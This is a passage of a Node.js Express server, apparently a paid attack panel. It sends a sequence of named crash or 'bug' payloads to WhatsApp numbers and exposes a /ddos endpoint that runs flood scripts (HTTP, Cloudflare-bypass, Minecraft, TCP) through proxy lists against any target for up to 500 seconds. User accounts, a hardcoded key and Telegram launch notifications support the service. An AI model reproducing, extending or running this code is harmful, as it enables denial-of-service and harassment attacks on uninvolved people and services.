        await send(XProtexImgXApi, jid);
        await sleep(3000);
        await send(XNecroDozerX, jid, true);
        await sleep(3000);
        await send(XCore, jid, false);
        await sleep(3000);
        await send(LocaX, jid);
        await sleep(3000);
        await send(AmeliaBeta, jid);
        await sleep(3000);
        await send(XNecroDelayX, jid, true);
        await sleep(3000);
        await send(XNecroDelayHard, jid, false);
        await sleep(3000);
        await send(bulldozer2GBxDocu, jid);
        await sleep(3000);
        await send(XNecroExtendSql, jid, false);
        break;

      default:
        return res.status(400).json({
          status: false,
          message: "metode tidak dikenali. Available: uibug, ios, delay"
        });
    }
    
// ===== tandai launch (persist) =====
const idx = accounts.findIndex(a => a.username === req.user.username);
if (idx >= 0) {
  accounts[idx].lastLaunch = Date.now();
  saveAccounts(accounts);
}

    return res.json({
      status: "200",
      creator: "@Kyxsancs",
      result: "sukses",
      target: jid.split("@")[0],
      metode: metode.toLowerCase(),
      user: req.user.username
    });

  } catch (err) {
    console.error("Gagal kirim:", err);
    return res.status(500).json({
      status: false,
      message: "Fitur Sedang Ada Perbaikan"
    });
  }
});

app.get('/api/me', authFromToken, (req, res) => {
  const accounts = loadAccounts();
  const acc = accounts.find(a => a.username === req.user.username);
  if (!acc) return res.json({ success:false, message:'User not found' });

  // expired: "" => Unlimited
  res.json({
    success: true,
    user: {
      username: acc.username,
      role: String(acc.role || 'USER').toUpperCase(),
      expired: acc.expired || ''
    }
  });
});

app.get("/ddos", requireAuth, enforceCooldown, async (req, res) => {
    try {
        const { key, metode, target, time, proxyUrl } = req.query;
        const ipClient = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        const waktu = new Date().toLocaleString();

        if (!key || !metode || !target || !time) {
            return res.status(400).json({
                status: false,
                message: "Required parameters: key, metode, target, time"
            });
        }

        if (key !== "NullByte") {
            return res.status(403).json({
                status: false,
                message: "Incorrect API key"
            });
        }

        const validMethods = ["saturn-down", "KILL-DO", "FLOOD", "CF", "MC-KILL", "TCP"]; // Menambahkan H2
        if (!validMethods.includes(metode)) {
            return res.status(400).json({
                status: false,
                message: `Method '${metode}' is not recognized. Valid methods: ${validMethods.join(', ')}`
            });
        }

        const duration = parseInt(time);
        if (isNaN(duration) || duration < 1 || duration > 500) {
            return res.status(400).json({
                status: false,
                message: "Time must be 1 - 500 seconds"
            });
        }

        const notifPesan = `
━────────────────────━
       𝐃D𝐎𝐒 - 𝐀𝐂𝐓𝐈𝐕𝐈𝐓𝐘
━────────────────────━
From User: ${req.user.username} (${req.user.role})
From IP: ${ipClient}
Time: ${waktu}
Method: ${metode}
Target: ${target}
Duration: ${duration}s
━────────────────────━
Bot By: @RoufzzzNotDev
    `;
        await bot.telegram.sendMessage(owner, notifPesan);

        let command;
        const { exec } = require("child_process");

        if (metode === "saturn-down") {
            command = `node god.js POST ${target} ${duration} 100 10 proxy.txt`;
        } else if (metode === "KILL-DO") {
            command = `node kill-do.js ${target} ${duration} 100 10 proxy.txt`;
        } else if (metode === "FLOOD") {
            command = `node zeus-flood.js ${target} ${duration} 100 10 proxy.txt`;
        } else if (metode === "CF") {
            command = `node chaptcha.js ${target} ${duration} 100 10 proxy.txt`;
        } else if (metode === "MC-KILL") {
            command = `node mc.js ${target} ${duration} 100 10 proxy.txt`;
        } else if (metode === "TCP") {
            command = `node tcp.js ${target} ${duration} 100 10 proxy.txt`;
        } else {
            return res.status(500).json({
                status: false,
                message: "Method not implemented."
            });
        }

        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.warn(`Stderr: ${stderr}`);
            }
            console.log(`Output: ${stdout}`);
        });

        res.json({
            status: true,
            Target: target,
            Methods: metode,
            Time: duration,
            News: "Success"
        });

    } catch (err) {
        console.error("DDOS attack error:", err);
        return res.status(500).json({
            status: false,
            message: "Internal server error"
        });
    }
});

app.use((req, res, next) => {
    res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
});

app.use((err, req, res, next) => {
  if (err && err.code === 'LIMIT_FILE_SIZE') {
    return res.status(413).json({ error: 'File terlalu besar. Maksimal 20 MB.' });
  }
  next(err);
});

app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({
        success: false,
        message: 'Internal Server Error'
    });
});

initializeWhatsAppConnections();       // existing (pairing nomor)  
bot.launch();

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server is running on port ${PORT}`);
    console.log(`📱 Access dashboard: http://0.0.0.0:${PORT}/dashboard`);
    console.log(`⚡ Access DDOS panel: http://0.0.0.0:${PORT}/ddos-dashboard`);
});
